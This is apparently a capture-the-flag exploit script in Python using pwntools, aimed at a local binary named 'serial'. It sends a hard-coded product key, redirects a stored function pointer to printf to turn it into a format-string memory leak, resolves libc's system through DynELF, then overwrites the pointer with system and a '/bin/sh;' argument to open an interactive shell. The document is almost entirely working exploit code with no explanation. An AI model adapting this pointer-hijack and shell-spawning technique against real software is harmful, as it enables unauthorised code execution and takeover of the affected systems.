#!/usr/bin python

from pwn import *

debug = 1
if debug:
    p = process('./serial')
else:
    pass

def add(s):
    p.recvuntil("choice >> ")
    p.sendline('1')
    p.recvuntil("insert >> ")
    p.sendline(s)

def remove(id):
    p.recvuntil("choice >> ")
    p.sendline('2')
    p.recvuntil("choice>> ")
    p.sendline(str(id))

def dump(choice_id):
    p.recvuntil("choice >> ")
    p.sendline(choice_id)

p.recvuntil("input product key: ")
p.sendline('615066814080')

printf_plt = 0x400790

def leak(addr):
    add("BB%13$sCC".ljust(24) + p64(printf_plt))
    dump("3AAAAAAA"+p64(addr))
    
    p.recvuntil("BB")

    data = p.recvuntil("CC")[:-2] + "\x00" #must adding \x00, becuase must leaking at least one byte data, 
    #print len(data)			   #however addr's content may be empty.
    remove(0)
    return data

d = DynELF(leak, elf = ELF('./serial'))
system_addr = d.lookup("system", "libc.so")
print "system_addr: " + hex(system_addr)

add('/bin/sh;'.ljust(24) + p64(system_addr)) #attention, adding \x00 not working
#gdb.attach(p)
dump('3')

p.interactive()
